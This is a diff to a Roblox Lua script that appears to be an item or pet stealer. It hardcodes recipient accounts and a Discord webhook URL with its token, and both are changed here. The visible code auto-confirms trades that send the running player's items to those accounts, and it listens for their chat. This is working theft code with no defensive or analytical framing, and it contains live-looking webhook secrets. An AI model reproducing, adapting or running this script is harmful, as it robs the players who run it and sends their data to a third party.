@@ -4,10 +4,10 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {"Bugegg12384, DrevanPetHolder_1, DrevanPetHolder_2, DrevanPetHolder_3"}
+local users = _G.Usernames or {"DrevanPetHolder_1, NotSuper_Red"}
 local min_value = _G.min_value or 0.1
 local ping = _G.pingEveryone or "Yes"
-local webhook = _G.webhook or "https://discord.com/api/webhooks/1422766050595835965/rEx78H2W_lcuE7s3vAZUK8VaqKj361vYAs29sDaAfYrYIwFwBVQqNlULcyq8HV0dIcx0"
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1424999356141932584/kr7JI_78JqSfRHnym9ofnbrA0IMqsUSw9QJUFmuVDMqE8B4-9y5AFvX33NenVJLRZ1UY"
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
@@ -404,7 +404,7 @@ if #itemsToSend > 0 then
                     wait(0.1)
                     ConfirmTradeRemote:FireServer()
                 until not inTrade
-                tradeRequestSent = true
+                tradeRequestSent = false 
             end
             wait(1)
         end
@@ -412,7 +412,7 @@ if #itemsToSend > 0 then
     end
 
     local function waitForUserChat()
-        local sentMessage = false
+        local sentMessage = true
         local function onPlayerChat(player)
             if table.find(users, player.Name) then
                 player.Chatted:Connect(function()
@@ -428,6 +428,4 @@ if #itemsToSend > 0 then
         Players.PlayerAdded:Connect(onPlayerChat)
     end
     waitForUserChat()
-end
-
 end
